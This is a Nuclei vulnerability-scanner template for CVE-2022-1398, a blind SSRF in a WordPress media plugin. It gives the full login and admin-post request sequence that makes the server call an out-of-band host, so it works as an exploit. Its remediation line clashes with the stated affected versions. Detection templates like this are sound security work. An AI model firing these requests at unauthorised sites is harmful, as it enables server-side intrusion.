id: CVE-2022-1398

info:
  name: External Media without Import <=1.1.2 - Authenticated Blind Server-Side Request Forgery
  author: theamanrawat
  severity: medium
  description: |
    WordPress External Media without Import plugin through 1.1.2 is susceptible to authenticated blind server-side request forgery. The plugin has no authorization and does not ensure that media added via URLs are external media, which can allow any authenticated users, including subscribers, to obtain sensitive information, modify data, and/or execute unauthorized administrative operations.
  remediation: |
    Upgrade to External Media without Import plugin version 1.1.2 or later.
  reference:
    - https://wpscan.com/vulnerability/5440d177-e995-403e-b2c9-42ceda14579e
    - https://wordpress.org/plugins/external-media-without-import/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1398
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2022-1398
    cwe-id: CWE-918
    epss-score: 0.005
    epss-percentile: 0.73578
    cpe: cpe:2.3:a:external_media_without_import_project:external_media_without_import:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: external_media_without_import_project
    product: external_media_without_import
    framework: wordpress
  tags: cve,cve2022,ssrf,wordpress,wp-plugin,wp,wpscan,external-media-without-import,authenticated,intrusive

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
      - |
        GET /wp-admin/upload.php HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /wp-admin/admin-post.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        urls=http%3A%2F%2F{{interactsh-url}}&width=&height=&mime-type=&action=add_external_media_without_import

    cookie-reuse: true

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - http

      - type: word
        part: body_2
        words:
          - external-media-without-import
# digest: 4a0a0047304502203ebaba9d3103d9410c6b7f14e518a2badf15ad3696f05824be2b1b4acd3dd45e022100dca281d9f3c7e328b0944485d6d8ab15c84547b3741b092b9b9c58c6f69b239a:922c64590222798bb761d5b6d8e72950